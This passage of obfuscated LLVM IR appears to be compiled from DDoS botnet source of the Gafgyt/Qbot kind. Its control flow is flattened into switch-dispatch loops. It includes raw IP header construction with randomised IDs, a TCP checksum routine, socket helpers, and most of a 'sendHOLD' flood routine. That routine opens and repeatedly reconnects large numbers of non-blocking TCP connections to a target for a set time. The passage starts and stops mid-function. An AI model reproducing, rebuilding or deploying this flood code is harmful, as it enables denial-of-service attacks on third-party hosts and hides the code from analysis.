  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 425546758, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 425546758, label %first
    i32 1056940614, label %7
    i32 -1274011678, label %8
    i32 -739640944, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 1056940614, i32 -1274011678
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -739640944, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 -739640944, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 281969763, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 281969763, label %first
    i32 874110536, label %14
    i32 1816759903, label %15
    i32 -136159842, label %38
    i32 -45796360, label %39
    i32 -2067592385, label %45
    i32 1352413376, label %46
    i32 404010104, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 874110536, i32 1816759903
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 404010104, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #2
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #13
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #2
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 -136159842, i32 -45796360
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 404010104, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 -2067592385, i32 1352413376
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 404010104, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 404010104, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %.reg2mem29 = alloca i32
  %.reg2mem6 = alloca %struct.state_t*
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  store i32 %31, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -92192792, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar5 = load i32, i32* %switchVar
  switch i32 %switchVar5, label %switchDefault [
    i32 -92192792, label %first
    i32 25050027, label %34
    i32 -639491279, label %35
    i32 686523776, label %51
    i32 -1951588092, label %56
    i32 -268876393, label %57
    i32 1632852340, label %62
    i32 -1729745016, label %NodeBlock3
    i32 -894682076, label %NodeBlock
    i32 -1018223861, label %LeafBlock1
    i32 -1764150702, label %LeafBlock
    i32 75374352, label %73
    i32 -302784419, label %101
    i32 -1218294674, label %106
    i32 1130563906, label %113
    i32 -806624706, label %118
    i32 1127431634, label %119
    i32 -1308975427, label %120
    i32 138779907, label %129
    i32 -1447994049, label %130
    i32 -1369536505, label %162
    i32 -1481437395, label %173
    i32 2098388638, label %184
    i32 -1232878062, label %189
    i32 -360752955, label %190
    i32 1910556898, label %194
    i32 1829207725, label %205
    i32 -1910865976, label %206
    i32 -1271327014, label %207
    i32 -2143091575, label %208
    i32 1475829544, label %217
    i32 1481869889, label %218
    i32 1667601983, label %250
    i32 -158823895, label %261
    i32 478056474, label %NewDefault
    i32 865433680, label %262
    i32 -505544949, label %263
    i32 1518833097, label %266
    i32 338798536, label %267
    i32 -1003185617, label %269
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %32 = icmp ne i32 %.reload, 0
  %33 = select i1 %32, i32 25050027, i32 -639491279
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1003185617, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t, i64 %39, align 16
  store %struct.state_t* %41, %struct.state_t** %.reg2mem6
  %.reload28 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %42 = bitcast %struct.state_t* %.reload28 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 %45, i32 16, i1 false)
  %46 = call noalias i8* @malloc(i64 1024) #2
  store i8* %46, i8** %16, align 8
  %47 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 1024, i32 1, i1 false)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = load i32, i32* %6, align 4
  %50 = add nsw i32 %48, %49
  store i32 %50, i32* %17, align 4
  store i32 686523776, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %17, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = icmp sgt i32 %52, %53
  %55 = select i1 %54, i32 -1951588092, i32 338798536
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 -268876393, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  %61 = select i1 %60, i32 1632852340, i32 1518833097
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %8, align 4
  %64 = sext i32 %63 to i64
  %.reload27 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload27, i64 %64
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %65, i32 0, i32 1
  %67 = load i8, i8* %66, align 4
  %68 = zext i8 %67 to i32
  store i32 %68, i32* %.reg2mem29
  store i32 -1729745016, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload33 = load volatile i32, i32* %.reg2mem29
  %Pivot4 = icmp slt i32 %.reload33, 1
  %69 = select i1 %Pivot4, i32 -1764150702, i32 -894682076
  store i32 %69, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem29
  %Pivot = icmp slt i32 %.reload31, 2
  %70 = select i1 %Pivot, i32 1127431634, i32 -1018223861
  store i32 %70, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload30 = load volatile i32, i32* %.reg2mem29
  %SwitchLeaf2 = icmp eq i32 %.reload30, 2
  %71 = select i1 %SwitchLeaf2, i32 -1271327014, i32 478056474
  store i32 %71, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload32 = load volatile i32, i32* %.reg2mem29
  %SwitchLeaf = icmp eq i32 %.reload32, 0
  %72 = select i1 %SwitchLeaf, i32 75374352, i32 478056474
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %.reload26 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload26, i64 %76
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %77, i32 0, i32 0
  store i32 %74, i32* %78, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %.reload25 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload25, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %.reload24 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload24, i64 %85
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %88, i32 3, i8* null)
  %90 = or i32 %89, 2048
  %91 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 4, i32 %90)
  %92 = load i32, i32* %8, align 4
  %93 = sext i32 %92 to i64
  %.reload23 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %94 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload23, i64 %93
  %95 = getelementptr inbounds %struct.state_t, %struct.state_t* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %98 = call i32 @connect(i32 %96, %struct.sockaddr* %97, i32 16)
  %99 = icmp ne i32 %98, -1
  %100 = select i1 %99, i32 -1218294674, i32 -302784419
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32* @__errno_location() #13
  %103 = load i32, i32* %102, align 4
  %104 = icmp ne i32 %103, 115
  %105 = select i1 %104, i32 -1218294674, i32 1130563906
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %8, align 4
  %108 = sext i32 %107 to i64
  %.reload22 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %109 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload22, i64 %108
  %110 = getelementptr inbounds %struct.state_t, %struct.state_t* %109, i32 0, i32 0
  %111 = load i32, i32* %110, align 8
  %112 = call i32 @close(i32 %111)
  store i32 -806624706, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %8, align 4
  %115 = sext i32 %114 to i64
  %.reload21 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %116 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload21, i64 %115
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %116, i32 0, i32 1
  store i8 1, i8* %117, align 4
  store i32 -806624706, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 865433680, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 -1308975427, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %121, i64 0, i64 0
  %123 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %122) #2, !srcloc !4
  %124 = extractvalue { i64, i64* } %123, 0
  %125 = extractvalue { i64, i64* } %123, 1
  %126 = trunc i64 %124 to i32
  store i32 %126, i32* %18, align 4
  %127 = ptrtoint i64* %125 to i64
  %128 = trunc i64 %127 to i32
  store i32 %128, i32* %19, align 4
  store i32 138779907, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 -1447994049, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i32, i32* %8, align 4
  %132 = sext i32 %131 to i64
  %.reload20 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %133 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload20, i64 %132
  %134 = getelementptr inbounds %struct.state_t, %struct.state_t* %133, i32 0, i32 0
  %135 = load i32, i32* %134, align 8
  %136 = srem i32 %135, 64
  %137 = zext i32 %136 to i64
  %138 = shl i64 1, %137
  %139 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %140 = load i32, i32* %8, align 4
  %141 = sext i32 %140 to i64
  %.reload19 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %142 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload19, i64 %141
  %143 = getelementptr inbounds %struct.state_t, %struct.state_t* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 8
  %145 = sdiv i32 %144, 64
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [16 x i64], [16 x i64]* %139, i64 0, i64 %146
  %148 = load i64, i64* %147, align 8
  %149 = or i64 %148, %138
  store i64 %149, i64* %147, align 8
  %150 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %150, align 8
  %151 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %151, align 8
  %152 = load i32, i32* %8, align 4
  %153 = sext i32 %152 to i64
  %.reload18 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %154 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload18, i64 %153
  %155 = getelementptr inbounds %struct.state_t, %struct.state_t* %154, i32 0, i32 0
  %156 = load i32, i32* %155, align 8
  %157 = add nsw i32 %156, 1
  %158 = call i32 @select(i32 %157, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %158, i32* %15, align 4
  %159 = load i32, i32* %15, align 4
  %160 = icmp eq i32 %159, 1
  %161 = select i1 %160, i32 -1369536505, i32 -360752955
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %163 = load i32, i32* %8, align 4
  %164 = sext i32 %163 to i64
  %.reload17 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload17, i64 %164
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = bitcast i32* %14 to i8*
  %169 = call i32 @getsockopt(i32 %167, i32 1, i32 4, i8* %168, i32* %13) #2
  %170 = load i32, i32* %14, align 4
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 -1481437395, i32 2098388638
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %.reload16 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload16, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = call i32 @close(i32 %178)
  %180 = load i32, i32* %8, align 4
  %181 = sext i32 %180 to i64
  %.reload15 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload15, i64 %181
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %182, i32 0, i32 1
  store i8 0, i8* %183, align 4
  store i32 -1232878062, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %8, align 4
  %186 = sext i32 %185 to i64
  %.reload14 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload14, i64 %186
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %187, i32 0, i32 1
  store i8 2, i8* %188, align 4
  store i32 -1232878062, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -1910865976, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i32, i32* %15, align 4
  %192 = icmp eq i32 %191, -1
  %193 = select i1 %192, i32 1910556898, i32 1829207725
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i32, i32* %8, align 4
  %196 = sext i32 %195 to i64
  %.reload13 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload13, i64 %196
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 8
  %200 = call i32 @close(i32 %199)
  %201 = load i32, i32* %8, align 4
  %202 = sext i32 %201 to i64
  %.reload12 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %203 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload12, i64 %202
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %203, i32 0, i32 1
  store i8 0, i8* %204, align 4
  store i32 1829207725, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  store i32 -1910865976, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  store i32 865433680, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  store i32 -2143091575, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %210 = getelementptr inbounds [16 x i64], [16 x i64]* %209, i64 0, i64 0
  %211 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %210) #2, !srcloc !5
  %212 = extractvalue { i64, i64* } %211, 0
  %213 = extractvalue { i64, i64* } %211, 1
  %214 = trunc i64 %212 to i32
  store i32 %214, i32* %20, align 4
  %215 = ptrtoint i64* %213 to i64
  %216 = trunc i64 %215 to i32
  store i32 %216, i32* %21, align 4
  store i32 1475829544, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  store i32 1481869889, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %8, align 4
  %220 = sext i32 %219 to i64
  %.reload11 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload11, i64 %220
